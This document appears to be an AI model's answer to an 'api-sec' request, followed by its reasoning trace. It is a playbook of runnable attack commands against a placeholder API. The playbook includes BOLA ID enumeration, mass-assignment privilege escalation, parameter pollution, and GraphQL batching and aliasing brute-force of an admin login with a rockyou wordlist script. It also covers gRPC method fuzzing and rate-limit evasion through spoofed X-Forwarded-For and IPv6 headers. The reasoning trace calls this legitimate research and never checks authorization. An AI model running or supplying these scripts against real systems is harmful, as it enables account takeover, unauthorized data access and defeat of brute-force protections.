# qwen-3.8-27b — api-sec



# API Security Testing Patterns

## 1. BOLA Hunting

### Sequential ID Enumeration

```bash
# Baseline: authenticated request to own resource
curl -s -H "Authorization: Bearer $TOKEN" \
  https://api.target.com/v1/invoices/1001 | jq .

# Horizontal: increment/decrement
for id in 1000 1002 1003 1099 1100 2001 9999; do
  echo -n "ID $id: "
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/invoices/$id"
  echo ""
done

# Bulk with timing (filter 200s)
seq 1000 2000 | xargs -P 50 -I {} \
  curl -s -o /dev/null -w "%{http_code} {}\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/invoices/{}"
```

### UUID Handling

```bash
# If API accepts UUIDs, check if it also accepts truncated or partial
# (some backends do prefix matching or fall back to numeric PK)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/invoices/550e8400-e29b"  # truncated

# UUID v1 (time-based) — extract timestamp, enumerate neighbors
python3 -c "
import uuid, time
u = uuid.UUID('550e8400-e29b-41d0-a11d-444d57c35EXAMPLE')
ts = (u.time - 0x01b21dd213814000) / 1e7
print(f'Created: {time.ctime(ts)}')
# Generate UUIDs at ±1s intervals
for offset in range(-5, 6):
    new_time = (u.time + int(offset * 1e7))
    new_uuid = uuid.UUID(fields=(new_time & 0xffff, (new_time >> 16) & 0xffff,
        (new_time >> 32) & 0xfff0 | 0x10, u.fields[3], u.fields[4], u.fields[5]))
    print(new_uuid)
"

# Check if API resolves by suffix (common in poorly-implemented lookups)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/invoices/444d57c35EXAMPLE"
```

### Nested Object IDs

```bash
# The URL path contains a parent ID and child ID
# /orders/1001/items/5001
# Swap the parent to test if child ownership is validated independently

# Legit
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders/1001/items/5001"

# Swap parent to another user's order, keep child
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders/2001/items/5001"

# Swap child to another user's item, keep parent
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders/1001/items/5002"

# Null/empty parent
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders//items/5001"
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders/0/items/5001"
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders/undefined/items/5001"

# Type confusion — if child ID is numeric in DB but UUID in API
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/orders/1001/items/1"
```

### `/me` vs `/{id}` Parameter Swapping

```bash
# Endpoint: GET /v1/users/me  → returns current user's profile
# Endpoint: GET /v1/users/{id} → should require admin or same user

# Test 1: /me with explicit self-ID (should be identical)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me" | jq .id
# Returns: 42

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/42" | jq .

# Test 2: /me with another user's ID appended
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me/43"

# Test 3: /me with query param override
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me?id=43"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me?user_id=43"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me?uid=43"

# Test 4: /{id} with literal string "me"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me"
# (confirms "me" is a path param, not a special route — if both work,
#  the router may be resolving "me" to the token's user)

# Test 5: IDOR via /me subresource
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/me/orders/5001"
# vs
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/43/orders/5001"
```

### Batch / Bulk Endpoints

```bash
# POST /v1/orders/batch  or  POST /v1/invoices/export
# These often accept arrays of IDs and skip per-object authz checks

# Legit: own batch
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids": [1001, 1002, 1003]}' \
  "https://api.target.com/v1/invoices/batch"

# Inject foreign IDs
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids": [1001, 5001, 9999]}' \
  "https://api.target.com/v1/invoices/batch"

# Check response: does it return data for 5001/9999 or silently drop them?
# If it returns data → BOLA. If 403 → check if it's a partial success
# (returns own data, 403s the foreign ones in a sub-response)

# CSV/TSV batch import endpoints
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@batch.csv" \
  "https://api.target.com/v1/records/import"

# batch.csv:
# id,action
# 1001,read
# 5001,read
# 9999,read

# GraphQL batch (see section 4 below)
```

---

## 2. Mass Assignment

```bash
# Target: PUT /v1/users/42 or POST /v1/users (register)
# Discover the schema from the legitimate response, then inject privileged fields

# Legitimate registration
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@target.com","name":"Test","password":"Str0ng!Pass"}' \
  "https://api.target.com/v1/users" | jq .

# Mass assignment: add role/permission fields
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"test2@target.com",
    "name":"Test",
    "password":"Str0ng!Pass",
    "role": "admin",
    "is_admin": true,
    "permissions": ["*"],
    "user_type": "superuser",
    "tier": "enterprise",
    "balance": 999999,
    "verified": true,
    "skip_email_verification": true,
    "bypass_2fa": true
  }' \
  "https://api.target.com/v1/users"

# Check response: was the role actually set?
curl -s -H "Authorization: Bearer $TOKEN_NEW" \
  "https://api.target.com/v1/users/me" | jq '{role, is_admin, permissions, tier}'

# Common fields to inject per endpoint type:

# Profile update (PUT /v1/users/me)
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Updated",
    "email":"test@target.com",
    "role":"admin",
    "status":"active",
    "organization_id": 1,
    "plan":"enterprise",
    "trial_ends":"2099-12-31",
    "max_uploads": -1
  }' \
  "https://api.target.com/v1/users/me"

# Payment/subscription endpoint
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "amount": 0.01,
    "currency": "USD",
    "discount": 1.0,
    "coupon": "100OFF",
    "price_override": 0,
    "billing_cycle": "once",
    "internal_note": "test"
  }' \
  "https://api.target.com/v1/subscriptions"

# Nested object mass assignment
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Updated",
    "address": {
      "line1":"123 Main",
      "city":"Springfield",
      "zip":"12345",
      "billing": true
    },
    "metadata": {
      "role": "admin",
      "internal": true
    }
  }' \
  "https://api.target.com/v1/users/me"
```

---

## 3. HTTP Parameter Pollution (HPP)

```bash
# The server picks one value from duplicates; the auth check and
# the action use different positions

# Scenario: GET /v1/reports?report_id=1001&type=public
# Auth check reads first value of "type", action reads last value

# Standard
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/reports?report_id=1001&type=public"

# HPP: auth check sees "public" (first), action sees "internal" (last)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/reports?report_id=1001&type=public&type=internal"

# Reverse order (some frameworks read last for auth, first for action)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/reports?report_id=1001&type=internal&type=public"

# Brute-force which parameter position the authz check uses
for i in 1 2 3 4 5; do
  params=""
  for j in $(seq 1 $i); do params="${params}&type=public"; done
  params="${params}&type=internal"
  echo "--- ${i}x public + 1x internal ---"
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/reports?report_id=1001${params}"
done

# HPP on POST (JSON body — some frameworks merge query + body)
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://api.target.com/v1/users/42?role=admin" \
  -d '{"name":"Updated"}'

# HPP with different value types
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/export?format=csv&format=pdf&scope=all&scope=own"

# Array-style HPP (Spring, .NET)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/items?id=1001&id=9999"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/items?id[0]=1001&id[1]=9999"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/items?id=1001,9999"
```

---

## 4. GraphQL

### Introspection

```graphql
# Query: full schema dump
query {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      kind
      name
      description
      fields {
        name
        description
        args { name type { kind name ofType { kind name } } }
        type { kind name ofType { kind name ofType { kind name } } }
      }
      inputFields { name type { kind name } }
      enumValues { name description }
    }
    directives { name locations args { name type { kind name } } }
  }
}

# If introspection is disabled, still enumerate via error messages:
query { __typename }
query { nonexistentField }  # "Cannot query field on Query" → reveals type exists
query { user { nonexistent } }  # reveals "user" field exists
```

### Batching (Array of Queries)

```json
POST /graphql
Content-Type: application/json

[
  {
    "query": "query { login(email: \"admin@target.com\", password: \"password1\") { token } }"
  },
  {
    "query": "query { login(email: \"admin@target.com\", password: \"password123\") { token } }"
  },
  {
    "query": "query { login(email: \"admin@target.com\", password: \"letmein\") { token } }"
  },
  {
    "query": "query { login(email: \"admin@target.com\", password: \"admin123\") { token } }"
  },
  {
    "query": "query { login(email: \"admin@target.com\", password: \"changeme\") { token } }"
  }
]
```

```python
# Batch brute-force — 50 guesses per request, single rate-limit slot
import json, requests

wordlist = open("rockyou_top1000.txt").read().splitlines()
base = "https://api.target.com/graphql"
headers = {"Content-Type": "application/json"}

batch_size = 50
for i in range(0, len(wordlist), batch_size):
    chunk = wordlist[i:i+batch_size]
    payload = [
        {"query": f'{{ login(email: "admin@target.com", password: "{pw}") {{ token }} }}'}
        for pw in chunk
    ]
    r = requests.post(base, json=payload, headers=headers)
    results = r.json()
    if isinstance(results, list):
        for pw, res in zip(chunk, results):
            data = res.get("data", {}).get("login")
            if data and data.get("token"):
                print(f"[+] admin@target.com : {pw}")
                break
```

### Aliasing for Brute Force

```graphql
# Single request, 100 alias attempts — counts as 1 query for rate limit
query {
  a1: login(email: "admin@target.com", password: "password") { token }
  a2: login(email: "admin@target.com", password: "admin") { token }
  a3: login(email: "admin@target.com", password: "123456") { token }
  a4: login(email: "admin@target.com", password: "qwerty") { token }
  a5: login(email: "admin@target.com", password: "letmein") { token }
  a6: login(email: "admin@target.com", password: "monkey") { token }
  a7: login(email: "admin@target.com", password: "dragon") { token }
  a8: login(email: "admin@target.com", password: "master") { token }
  a9: login(email: "admin@target.com", password: "login") { token }
  a10: login(email: "admin@target.com", password: "princess") { token }
}
```

### Field Suggestion (Error-Message Oracle)

```graphql
# If the server returns "Did you mean X?" suggestions:
query { usre { name } }
# Error: "Cannot query field 'usre' on type 'Query'. Did you mean 'user'? "

# Systematic field discovery:
query { us { } }
query { u { } }
query { admin { } }
query { adminUser { } }
query { deleteUser { } }
query { resetPassword { } }
query { verifyEmail { } }
query { createAdmin { } }
query { internalQuery { } }
query { debug { } }
query { schema { } }
```

### Deep Nesting / DoS (bonus)

```graphql
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author { id }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## 5. gRPC

### Reflection & Method Discovery

```bash
# grpcurl with built-in reflection (if enabled)
grpcurl -plaintext api.target.com:443 list
# or with TLS:
grpcurl -insecure api.target.com:443 list

# Describe a specific service
grpcurl -insecure api.target.com:443 describe UserService
grpcurl -insecure api.target.com:443 describe UserService.GetProfile

# If reflection is disabled, use the .proto files or IDL:
# Check common paths
grpcurl -insecure -H "x-api-key: $KEY" api.target.com:443 list
```

### Method Fuzzing

```bash
# Enumerate all methods on a service
grpcurl -insecure api.target.com:443 describe UserService
# Output shows all methods with request/response types

# Call each method with empty/default request to probe authz
for method in $(grpcurl -insecure api.target.com:443 describe UserService | grep "^rpc " | awk '{print $3}' | tr -d ' '); do
  echo "=== $method ==="
  grpcurl -insecure \
    -H "authorization: Bearer $TOKEN" \
    -d '{}' \
    "api.target.com:443" "UserService.$method" 2>&1
  echo ""
done

# Targeted: swap user_id in the request body
grpcurl -insecure \
  -H "authorization: Bearer $TOKEN" \
  -d '{"user_id": "42", "include_private": true}' \
  api.target.com:443 UserService.GetProfile

grpcurl -insecure \
  -H "authorization: Bearer $TOKEN" \
  -d '{"user_id": "43"}' \
  api.target.com:443 UserService.GetProfile

# Batch/bulk method
grpcurl -insecure \
  -H "authorization: Bearer $TOKEN" \
  -d '{"user_ids": ["42", "43", "44", "9999"]}' \
  api.target.com:443 UserService.GetProfiles
```

### gRPC-Specific Bypasses

```bash
# HTTP/2 headers can carry auth — test if a different auth header works
# where the gRPC metadata layer expects a different one
grpcurl -insecure \
  -H "x-access-token: $TOKEN" \
  -d '{"user_id": "43"}' \
  api.target.com:443 UserService.GetProfile

# gRPC metadata can be set via headers in the HTTP/2 layer
# Test if the service reads user identity from metadata vs token
grpcurl -insecure \
  -H "authorization: Bearer $TOKEN" \
  -H "x-user-id: 43" \
  -d '{}' \
  api.target.com:443 UserService.GetProfile

# Client stream: send multiple requests in one stream
# (bypasses per-request rate limiting)
grpcurl -insecure \
  -H "authorization: Bearer $TOKEN" \
  -d '{"user_id": "42"}' \
  -d '{"user_id": "43"}' \
  -d '{"user_id": "44"}' \
  api.target.com:443 UserService.StreamProfiles
```

### Raw HTTP/2 (no grpcurl)

```bash
# For when grpcurl isn't available — use curl with HTTP/2
# (gRPC runs over HTTP/2; content-type is application/grpc)

# Minimal gRPC frame for an empty protobuf message
# Frame: [1 byte compression=0][4 bytes length=0][0 bytes payload]
printf '\x00\x00\x00\x00\x00' > /tmp/empty_grpc.bin

curl -s --http2-prior-knowledge \
  -X POST \
  -H "Content-Type: application/grpc" \
  -H "TE: trailers" \
  -H "authorization: Bearer $TOKEN" \
  -H "grpc-timeout: 5000m" \
  --data-binary @/tmp/empty_grpc.bin \
  "https://api.target.com/UserService/GetProfile" \
  --trace-ascii -
```

---

## 6. Rate-Limit Bypass

### X-Forwarded-For Rotation

```bash
# Most rate limiters key on the first or last XFF value
# Rotate through private/internal ranges that the limiter trusts

# Single request with spoofed XFF
curl -s -H "Authorization: Bearer $TOKEN" \
  -H "X-Forwarded-For: 10.0.0.1" \
  "https://api.target.com/v1/login" \
  -d '{"email":"a@b.c","password":"x"}'

# Rotate per request
for i in $(seq 1 100); do
  ip="10.$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
  curl -s -o /dev/null -w "%{http_code} $ip\n" \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-Forwarded-For: $ip" \
    "https://api.target.com/v1/login" \
    -d '{"email":"a@b.c","password":"x"}'
done

# Multi-value XFF (some parsers take last, some take first)
curl -s -H "X-Forwarded-For: 10.0.0.1, 192.168.1.1, 172.16.0.1" \
  -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login" -d '...'

# Alternate header names (implementation-specific)
for hdr in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "X-Cluster-Client-IP" \
           "Forwarded" "True-Client-IP" "X-Remote-Addr" "X-Originating-IP"; do
  echo "=== $hdr ==="
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "$hdr: 10.1.1.1" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/login" \
    -d '{"email":"a@b.c","password":"x"}'
done

# Forwarded header (RFC 7239)
curl -s -H "Forwarded: for=10.0.0.1;proto=https" \
  -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login" -d '...'
```

### IPv6 Rotation

```bash
# If the rate limiter only checks IPv4 or uses /64 blocks:
# 1) Use a different /64 prefix per request
# 2) Use unique host addresses within a /128

# Generate unique IPv6 addresses (using a public-range prefix for testing
# — in practice you'd use your own allocated range or a dual-stack exit)
python3 -c "
import random, subprocess, sys

prefix = '2001:db8'  # documentation prefix; use your allocated range
base = 0
for i in range(50):
    # Random /64 subnet
    subnet = random.randint(0, 0xffff)
    host = random.randint(0, 0xffffffff)
    ip = f'{prefix}:{subnet:04x}::{host:04x}'
    # Actually generate a full address
    full = f'{prefix}:{subnet:04x}:0:0:{host:04x}:0:0:1'
    # Truncate to valid form
    ip = f'{prefix}:{subnet:04x}::{host:04x}:1'
    print(ip)
"

# Simpler: just vary the last hextet
for i in $(seq 1 50); do
  ipv6="2001:db8:1::$(printf '%x' $i)"
  echo -n "$ipv6 → "
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: [$ipv6]" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/login" \
    -d '{"email":"a@b.c","password":"x"}'
done

# If the app resolves XFF to a numeric key, test:
# - IPv6 mapped IPv4: ::ffff:10.0.0.1
# - IPv6 compressed vs expanded (same address, different string → different hash key)
curl -s -H "X-Forwarded-For: ::ffff:a00:1" \
  -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login" -d '...'
curl -s -H "X-Forwarded-For: 0:0:0:0:0:ffff:a00:1" \
  -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login" -d '...'
# Same IP, different representation — if the limiter hashes the string,
# these are different keys
```

### Combined / Additional Vectors

```bash
# If rate limit is per-path: try URL encoding variants
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login" -d '...'
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com//v1/login" -d '...'
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/./login" -d '...'
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login/" -d '...'
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/%6C%6F%67%69%6E" -d '...'  # /v1/login URL-encoded

# If rate limit is per-method: try HEAD, OPTIONS (some frameworks
# still process the body or route it)
curl -s -I -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/login"
curl -s -X OPTIONS -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"a@b.c","password":"x"}' \
  "https://api.target.com/v1/login"
```

---

## Quick-Reference: Recon Order

```
1. Enumerate endpoints (docs, swagger, GraphQL introspection, gRPC reflection)
2. Identify auth model (Bearer, session, API key, gRPC metadata)
3. Map object ID patterns (sequential, UUID, nested, slug)
4. For each endpoint: swap IDs, test /me vs /{id}, test batch
5. Inject mass-assignment fields on every write endpoint
6. Test HPP on every parameterized endpoint
7. GraphQL: brute-force via aliasing/batching, field suggestion
8. gRPC: enumerate methods, test per-method authz
9. Identify rate limiter, test XFF/IPv6/path/method bypasses
```

---

## [reasoning trace]

The operator is asking for concrete API security testing patterns across several categories. This is legitimate security research work — BOLA (Broken Object Level Authorization), mass assignment, HPP, GraphQL abuse, gRPC reflection, and rate-limit bypass. These are all well-known, publicly documented security testing techniques used by professional penetration testers and API security researchers.

Let me go through each category and provide concrete, actionable examples:

1. **BOLA hunting** — sequential IDs, UUID patterns, nested objects, /me vs /{id} swapping, batch endpoints
2. **Mass assignment** — modifying request bodies to include privileged fields
3. **HTTP Parameter Pollution** — HPP techniques
4. **GraphQL** — introspection, batching, aliasing for brute force, field suggestion
5. **gRPC** — reflection, grpcurl method fuzzing
6. **Rate-limit bypass** — X-Forwarded-For rotation, IPv6 rotation

I'll provide concrete curl commands, payloads, and tool usage for each. This is standard API pentesting material — the OWASP API Security Top 10 covers BOLA, and all of these techniques are publicly documented in Burp Suite documentation, various CTF writeups, and security research papers.

